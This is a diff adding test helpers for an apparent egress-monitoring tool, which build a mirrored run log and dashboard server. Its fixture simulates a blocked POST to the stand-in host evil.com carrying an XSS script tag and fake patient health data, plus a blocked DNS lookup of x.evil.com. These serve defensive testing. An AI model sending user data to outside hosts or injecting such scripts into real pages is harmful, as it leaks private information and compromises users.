@@ -175,3 +175,53 @@ def make_engine(tmp_path, key, fs, violations=None):
                  full_scan_every=3)
     gate = EgressGate(pol, WalWriter(tmp_path / "run" / "proxy-wal", tmp_path / "run" / "evidence"))
     return eng, gate
+
+
+DASH_SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"
+DASH_KEY = "sess-key"
+
+
+def start_dashboard(tmp_path, key):
+    """A verified mirror with one sent request, one blocked attempt carrying user data and one DNS lookup,
+    served by the dashboard on a free port. Returns (app, base_url, server)."""
+    import threading
+
+    from poi.dashboard import DashboardApp, make_dashboard_server
+    from poi.fingerprint import FingerprintSet
+    from poi.ledger import pubkey_hex
+    from poi.mirror import Mirror
+    from poi.source import LocalSource
+
+    fs = FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS)
+    eng, gate = make_engine(tmp_path, key, fs)
+    (tmp_path / "run").mkdir(exist_ok=True)
+    (tmp_path / "run" / "policy.yaml").write_bytes(POLICY)
+    eng.genesis()
+    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
+    gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":0.5}')
+    gate.on_request("evil.com", "POST", "/drop", [], b"<script>alert(1)</script>" + DASH_SECRET)
+    gate.wal.record_dns("2026-10-13T18:00:00Z", "x.evil.com", "A", "block")
+    fs.write("/tmp", None)
+    fs.write("/tmp/x", b"1")
+    eng.tick()
+    fp = FingerprintSet(b"k" * 32)
+    fp.add(DASH_SECRET, "patients.csv")
+    m = Mirror(tmp_path / "mirror", LocalSource(tmp_path / "run", runtime=lambda: {"status": "running"}),
+               pubkey_hex(key), fp, sleep=lambda s: None)
+    m.sync_once(wait=0)
+    m.refresh_runtime()
+    app = DashboardApp(m, "local:run")
+    srv = make_dashboard_server(app, DASH_KEY, port=0)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    return app, f"http://127.0.0.1:{srv.server_address[1]}", srv
+
+
+def http_call(url, method="GET", headers=None):
+    import urllib.error
+    import urllib.request
+    req = urllib.request.Request(url, method=method, headers=headers or {})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.status, r.headers, r.read()
+    except urllib.error.HTTPError as e:
+        return e.code, e.headers, e.read()
